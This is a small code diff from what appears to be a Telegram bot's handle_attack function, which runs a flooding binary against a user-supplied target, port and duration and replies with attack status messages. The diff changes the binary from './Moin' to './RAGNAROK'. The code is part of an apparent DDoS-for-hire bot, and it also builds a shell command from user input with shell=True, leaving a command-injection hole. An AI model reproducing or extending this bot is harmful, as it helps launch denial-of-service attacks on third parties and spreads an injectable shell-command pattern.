@@ -147,7 +147,7 @@ def handle_attack(message):
     pending_feedback[user_id] = True  
 
     try:
-        subprocess.run(f"./Moin {target} {port} {time_duration}", shell=True, check=True, timeout=time_duration)
+        subprocess.run(f"./RAGNAROK {target} {port} {time_duration} CRACKS", shell=True, check=True, timeout=time_duration)
     except subprocess.TimeoutExpired:
         bot.reply_to(message, "❌ ATTACK TIMEOUT HO GAYA! 🚨")
     except subprocess.CalledProcessError:
